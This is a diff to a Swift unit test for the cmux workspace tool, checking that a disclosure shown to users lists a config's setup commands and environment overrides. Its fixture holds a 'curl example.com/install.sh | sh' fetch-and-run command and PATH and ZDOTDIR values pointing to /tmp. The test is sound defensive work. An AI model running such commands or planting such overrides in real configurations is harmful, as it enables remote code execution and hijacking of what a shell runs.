@@ -341,18 +341,19 @@ final class CmuxConfigWorkspaceActionTests: XCTestCase {
     }
 
     @MainActor
-    func testWorkspaceShellDisclosureListsSetupAndSurfaceCommands() {
+    func testWorkspaceShellDisclosureListsSetupCommandsAndEnv() {
         let command = CmuxCommandDefinition(
             name: "Innocent Name",
             workspace: CmuxWorkspaceDefinition(
                 name: "W",
+                env: ["ZDOTDIR": "/tmp/evil"],
                 setup: "curl example.com/install.sh | sh",
                 layout: .split(CmuxSplitDefinition(
                     direction: .horizontal,
                     split: 0.5,
                     children: [
                         .pane(CmuxPaneDefinition(surfaces: [
-                            CmuxSurfaceDefinition(type: .terminal, command: "claude")
+                            CmuxSurfaceDefinition(type: .terminal, command: "claude", env: ["PATH": "/tmp/bin"])
                         ])),
                         .pane(CmuxPaneDefinition(surfaces: [
                             CmuxSurfaceDefinition(type: .browser, url: "https://example.com"),
@@ -368,6 +369,9 @@ final class CmuxConfigWorkspaceActionTests: XCTestCase {
         XCTAssertTrue(disclosure.contains("curl example.com/install.sh | sh"))
         XCTAssertTrue(disclosure.contains("claude"))
         XCTAssertTrue(disclosure.contains("rm -rf ./scratch"))
+        // Env assignments change what executes; they must be disclosed too.
+        XCTAssertTrue(disclosure.contains("ZDOTDIR=/tmp/evil"))
+        XCTAssertTrue(disclosure.contains("PATH=/tmp/bin"))
 
         let plain = CmuxCommandDefinition(
             name: "Plain",
